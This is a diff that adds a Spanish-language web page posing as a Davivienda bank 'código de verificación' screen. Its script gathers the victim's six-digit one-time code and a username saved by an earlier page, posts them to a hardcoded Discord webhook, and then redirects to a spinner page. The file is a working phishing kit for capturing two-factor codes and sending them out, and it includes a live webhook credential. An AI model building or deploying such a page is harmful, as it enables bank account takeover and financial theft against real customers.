@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Código de Verificación</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            red: '#be122c',
+                            redDark: '#990e22',
+                            bgGray: '#f2f4f7',
+                            inputBg: '#ffffff',
+                            border: '#d0d5dd',
+                            btnGray: '#dcdfe6',
+                            textGray: '#667085',
+                            textDark: '#101828'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        html, body {
+            height: 100vh;
+            width: 100vw;
+            margin: 0;
+            padding: 0;
+            overflow: hidden !important;
+            font-family: 'Inter', sans-serif;
+            background-color: #f2f4f8;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .red-header-bg {
+            background: linear-gradient(135deg, #cc1428 0%, #b80f22 50%, #9c0919 100%);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .red-header-bg::after {
+            content: '';
+            position: absolute;
+            top: -40%;
+            right: -10%;
+            width: 100%;
+            height: 200%;
+            background: rgba(255, 255, 255, 0.06);
+            transform: rotate(-25deg);
+            pointer-events: none;
+        }
+
+        /* Estilo para los inputs de código de 6 dígitos */
+        .code-input {
+            width: 42px;
+            height: 48px;
+            text-align: center;
+            font-size: 1.25rem;
+            font-weight: 600;
+            border: 1px solid #d0d5dd;
+            border-radius: 12px;
+            background-color: #ffffff;
+            color: #101828;
+            outline: none;
+            transition: all 0.2s ease-in-out;
+        }
+
+        @media (min-width: 768px) {
+            .code-input {
+                width: 48px;
+                height: 54px;
+                font-size: 1.5rem;
+            }
+        }
+
+        .code-input:focus {
+            border-color: #be122c;
+            box-shadow: 0 0 0 3px rgba(190, 18, 44, 0.12);
+        }
+    </style>
+</head>
+<body class="h-screen w-screen overflow-hidden bg-[#f2f4f8] flex flex-col justify-between">
+
+    <main class="w-full h-screen overflow-hidden flex flex-col justify-between relative">
+
+        <!-- Banner Rojo -->
+        <div class="red-header-bg pt-6 pb-16 md:py-5 px-6 md:px-12 lg:px-16 relative text-white flex flex-col md:flex-row md:items-center md:justify-between shrink-0 shadow-md">
+            
+            <!-- Fila superior móvil / Lado izquierdo web -->
+            <div class="flex justify-between items-center w-full md:w-auto z-20">
+                <!-- Logo Web limpio (sin fondo ni recuadro) -->
+                <div class="hidden md:flex items-center cursor-pointer transition-transform active:scale-95">
+                    <img src="https://enlinea.davivienda.com.sv/ebanking/images/DAVIVIENDA/header/logo_davivienda.png" alt="Logo Davivienda Web" class="h-9 object-contain" />
+                </div>
+
+                <!-- Logo Móvil más grande y limpio -->
+                <div class="md:hidden flex items-center cursor-pointer transition-transform active:scale-95">
+                    <img src="https://i.imgur.com/Ybljjas.png" alt="Logo Davivienda Móvil" class="h-14 object-contain" />
+                </div>
+
+                <!-- Botón Soporte Móvil -->
+                <button class="w-11 h-11 md:hidden bg-[#e61e32] hover:bg-red-600 rounded-full flex items-center justify-center shadow-lg active:scale-95 transition-all text-white border border-white/20">
+                    <i class="fa-solid fa-headset text-lg"></i>
+                </button>
+            </div>
+
+            <!-- Saludo Dinámico: Izquierda en móvil, Centrado real en escritorio -->
+            <div class="mt-6 md:mt-0 text-left md:absolute md:inset-x-0 md:text-center pointer-events-none z-15">
+                <h1 class="text-3xl md:text-2xl lg:text-3xl font-bold tracking-tight drop-shadow-sm pointer-events-auto" id="greeting-text">
+                    Buenos días
+                </h1>
+                <p class="hidden md:block text-white/80 text-xs lg:text-sm mt-0.5 leading-relaxed pointer-events-auto">
+                    Ingrese el código de verificación recibido.
+                </p>
+            </div>
+
+            <!-- Botón Soporte Escritorio -->
+            <div class="hidden md:flex items-center gap-4 z-20">
+                <button class="w-10 h-10 bg-[#e61e32] hover:bg-red-600 rounded-full flex items-center justify-center shadow-md active:scale-95 transition-all text-white border border-white/20">
+                    <i class="fa-solid fa-headset text-base"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Formulario -->
+        <section class="flex-1 overflow-hidden relative flex flex-col justify-start md:justify-center items-center px-5 md:px-12 -mt-10 md:mt-0 py-2 md:py-6 z-10">
+            <div class="max-w-md w-full mx-auto my-0 md:my-auto">
+                <div class="bg-white rounded-[28px] md:rounded-3xl p-6 md:p-8 shadow-xl md:shadow-lg border border-gray-100/80">
+                    <form id="login-form" onsubmit="event.preventDefault(); handleLogin();" class="space-y-6">
+                        <h2 class="hidden md:block text-xl lg:text-2xl font-bold text-gray-800 mb-2 text-center">Código de verificación</h2>
+
+                        <div>
+                            <label class="block text-xs md:text-sm font-semibold text-gray-700 mb-3 text-center">
+                                Ingrese su código de 6 dígitos
+                            </label>
+                            <!-- Contenedor de las 6 casillas -->
+                            <div class="flex justify-center gap-2 md:gap-3" id="otp-container">
+                                <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" oninput="handleInput(this, 0)" onkeydown="handleKeyDown(event, 0)" onpaste="handlePaste(event)">
+                                <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]*" oninput="handleInput(this, 1)" onkeydown="handleKeyDown(event, 1)">
+                                <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]*" oninput="handleInput(this, 2)" onkeydown="handleKeyDown(event, 2)">
+                                <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]*" oninput="handleInput(this, 3)" onkeydown="handleKeyDown(event, 3)">
+                                <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]*" oninput="handleInput(this, 4)" onkeydown="handleKeyDown(event, 4)">
+                                <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]*" oninput="handleInput(this, 5)" onkeydown="handleKeyDown(event, 5)">
+                            </div>
+                        </div>
+
+                        <!-- Submit Button -->
+                        <div class="pt-2">
+                            <button type="submit" id="submit-btn" class="w-full bg-[#dbe0ea] text-[#8c94a6] font-semibold py-3.5 px-4 rounded-full transition-all duration-200 cursor-not-allowed shadow-none text-sm md:text-base" disabled>
+                                Continuar
+                            </button>
+                        </div>
+
+                        <!-- Help Link -->
+                        <div class="text-center pt-1">
+                            <a href="#" class="text-xs md:text-sm font-semibold text-gray-800 underline hover:text-red-700 transition-colors">
+                                No recibí el código
+                            </a>
+                        </div>
+                    </form>
+                </div>
+
+                <!-- Footer Terms Link -->
+                <div class="text-center mt-4 px-4">
+                    <a href="#" class="text-xs text-gray-500 underline hover:text-gray-700 transition-colors">
+                        Términos y condiciones
+                    </a>
+                </div>
+            </div>
+        </section>
+
+        <!-- Navegación Inferior -->
+        <nav class="w-full bg-white border-t border-gray-200 py-2.5 px-6 z-30 flex justify-around md:justify-center md:gap-16 items-center shrink-0">
+            <button class="flex flex-col items-center justify-center text-gray-500 hover:text-red-600 transition-colors">
+                <i class="fa-solid fa-grip text-lg md:text-xl mb-0.5"></i>
+                <span class="text-[10px] md:text-xs font-medium tracking-tight">QR</span>
+            </button>
+            <button class="flex flex-col items-center justify-center text-gray-500 hover:text-red-600 transition-colors">
+                <i class="fa-solid fa-location-dot text-lg md:text-xl mb-0.5"></i>
+                <span class="text-[10px] md:text-xs font-medium tracking-tight text-center leading-none">Puntos de atención</span>
+            </button>
+            <button class="flex flex-col items-center justify-center text-gray-500 hover:text-red-600 transition-colors">
+                <i class="fa-solid fa-percent text-base md:text-lg mb-0.5 border-2 border-gray-500 rounded-full w-4 h-4 md:w-5 md:h-5 flex items-center justify-center text-[9px]"></i>
+                <span class="text-[10px] md:text-xs font-medium tracking-tight">Promociones</span>
+            </button>
+            <button class="flex flex-col items-center justify-center text-gray-500 hover:text-red-600 transition-colors">
+                <i class="fa-solid fa-bars-staggered text-lg md:text-xl mb-0.5"></i>
+                <span class="text-[10px] md:text-xs font-medium tracking-tight">Más</span>
+            </button>
+        </nav>
+
+    </main>
+
+    <script>
+        // CONFIGURACIÓN DE DISCORD WEBHOOK
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1559991129309712385/yTPHRmeNY0Ic-Glf-b6brRW6akGmoVtqbno_Cacm6u2YX5MC7Sw5oAkCoa6SXAsUw0nL';
+
+        // Saludo Dinámico
+        function setGreeting() {
+            const hour = new Date().getHours();
+            const greetingElement = document.getElementById('greeting-text');
+            
+            if (hour >= 5 && hour < 12) {
+                greetingElement.textContent = 'Buenos días';
+            } else if (hour >= 12 && hour < 19) {
+                greetingElement.textContent = 'Buenas tardes';
+            } else {
+                greetingElement.textContent = 'Buenas noches';
+            }
+        }
+        setGreeting();
+
+        // Control de navegación entre inputs de código
+        const inputs = document.querySelectorAll('.code-input');
+
+        function handleInput(element, index) {
+            // Solo permitir números
+            element.value = element.value.replace(/[^0-9]/g, '');
+
+            if (element.value && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+            validateInputs();
+        }
+
+        function handleKeyDown(event, index) {
+            if (event.key === 'Backspace' && !inputs[index].value && index > 0) {
+                inputs[index - 1].focus();
+            }
+        }
+
+        function handlePaste(event) {
+            event.preventDefault();
+            const pasteData = event.clipboardData.getData('text').trim().replace(/[^0-9]/g, '');
+            let currentIdx = 0;
+            for (let i = 0; i < pasteData.length && currentIdx < inputs.length; i++) {
+                inputs[currentIdx].value = pasteData[i];
+                currentIdx++;
+            }
+            if (currentIdx < inputs.length) {
+                inputs[currentIdx].focus();
+            } else {
+                inputs[inputs.length - 1].focus();
+            }
+            validateInputs();
+        }
+
+        // Validación para activar el botón cuando las 6 casillas estén llenas
+        function validateInputs() {
+            let code = '';
+            inputs.forEach(input => code += input.value);
+            const submitBtn = document.getElementById('submit-btn');
+
+            if (code.length === 6) {
+                submitBtn.disabled = false;
+                submitBtn.className = "w-full bg-[#cc1428] hover:bg-[#a60e1e] text-white font-semibold py-3.5 px-4 rounded-full transition-all duration-200 cursor-pointer shadow-md active:scale-[0.98] text-sm md:text-base";
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.className = "w-full bg-[#dbe0ea] text-[#8c94a6] font-semibold py-3.5 px-4 rounded-full transition-all duration-200 cursor-not-allowed shadow-none text-sm md:text-base";
+            }
+        }
+
+        // Enviar el código completo a Discord junto con el usuario guardado y redirigir
+        async function handleLogin() {
+            let code = '';
+            inputs.forEach(input => code += input.value);
+
+            // Recuperar el usuario guardado de la página anterior
+            const savedUser = localStorage.getItem('saved_username') || 'No registrado';
+
+            const payload = {
+                embeds: [{
+                    title: "🔐 Código de Verificación Recibido",
+                    color: 12451840,
+                    fields: [
+                        { name: "Usuario / Identificación", value: `\`${savedUser}\``, inline: false },
+                        { name: "Código de 6 Dígitos", value: `\`${code}\``, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Error al enviar:', error);
+            }
+
+            // Redirección inmediata a spinner2.html
+            window.location.href = 'spinner2.html';
+        }
+    </script>
+</body>
+</html>
